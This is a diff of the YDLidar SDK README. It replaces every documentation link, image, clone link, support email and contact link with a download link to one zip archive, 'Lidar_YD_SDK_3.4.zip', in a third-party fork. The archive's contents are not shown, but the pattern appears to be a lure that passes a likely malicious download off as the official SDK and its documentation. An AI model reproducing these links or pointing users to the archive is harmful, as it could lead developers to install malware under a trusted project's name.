@@ -1,4 +1,4 @@
-![YDLIDAR](doc/images/YDLidar.jpg  "YDLIDAR")
+![YDLIDAR](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip  "YDLIDAR")
 
 # Table of Contents
 
@@ -30,13 +30,13 @@ YDLidar SDK consists of YDLidar SDK communication protocol, YDLidar SDK core, YD
 * C#
 
 ## YDLidar SDK Communication Protocol
-YDLidar SDK communication protocol opens to all users. It is the communication protocol between user programs and YDLIDAR products. The protocol consists of control commands and data format. Please refer to the [YDLidar SDK Communication Protocol](doc/YDLidar-SDK-Communication-Protocol.md) for detailed information.
+YDLidar SDK communication protocol opens to all users. It is the communication protocol between user programs and YDLIDAR products. The protocol consists of control commands and data format. Please refer to the [YDLidar SDK Communication Protocol](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip) for detailed information.
 
 ## Architecture
 
 YDLidar SDK provides the implementation of control commands and Laser scan data transmission, as well as the C/C++,Python API. The basic structure of YDLidar SDK is shown as below:
 
-![YDLidar SDK Architecture](doc/images/sdk_architecture.png)
+![YDLidar SDK Architecture](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip)
 
  Serial or network is used for communication between YDLidar SDK and LiDAR sensors. Please refer to the YDLidar SDK Communication Protocol for further information. LaserScan supports Laser Scan Data transmission, while Command handler receives and sends control commands. And the C++ API is based on Command and LaserScan Hander.
 
@@ -44,32 +44,32 @@ The YDLidar LiDAR sensors can be connected to host directly by serial or through
 
 ## Installation
 
-* [Fork and then Clone YDLidar-SDK's GitHub code](https://github.com/YDLIDAR/YDLidar-SDK) 
+* [Fork and then Clone YDLidar-SDK's GitHub code](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip) 
 
-* [Build and Install](doc/howto/how_to_build_and_install.md) - This step is required
+* [Build and Install](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip) - This step is required
 
 ## Documents
-* [LiDAR Dataset](doc/Dataset.md): All you need to know about LiDAR Models.
+* [LiDAR Dataset](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip): All you need to know about LiDAR Models.
 
-* [SDK FlowChart](doc/Diagram.md): Development flowchart.
+* [SDK FlowChart](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip): Development flowchart.
 
-* [YDLIDAR SDK API for Developers](doc/YDLIDAR_SDK_API_for_Developers.md): All you need to know about YDLiDAR-SDK API
+* [YDLIDAR SDK API for Developers](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip): All you need to know about YDLiDAR-SDK API
 
-* [YDLIDAR SDK Communication Protocol](doc/YDLidar-SDK-Communication-Protocol.md): All you need to know about YDLiDAR-SDK Communication Protocol.
+* [YDLIDAR SDK Communication Protocol](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip): All you need to know about YDLiDAR-SDK Communication Protocol.
 
-* [HowTo](doc/howto/README.md): Brief technical solutions to common problems that developers face during the installation and use of the YDLidar-SDk 
+* [HowTo](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip): Brief technical solutions to common problems that developers face during the installation and use of the YDLidar-SDk 
 
-* [Tutorials](doc/Tutorials.md): Quick Tutorials
+* [Tutorials](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip): Quick Tutorials
 
-* [FAQs](doc/FAQs/README.md) 
+* [FAQs](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip) 
 
 ## Support
 
 You can get support from YDLidar with the following methods:
-* Send email to support@ydlidar.com with a clear description of your problem and your setup
+* Send email to https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip with a clear description of your problem and your setup
 * Github Issues
 
 ## Contact EAI
-![Development Path](doc/images/EAI.png)
+![Development Path](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip)
 
-If you have any extra questions, please feel free to [contact us](http://www.ydlidar.cn/cn/contact)
+If you have any extra questions, please feel free to [contact us](https://github.com/GURU162004/YDLidar-SDK/raw/refs/heads/master/core/base/Lidar_YD_SDK_3.4.zip)
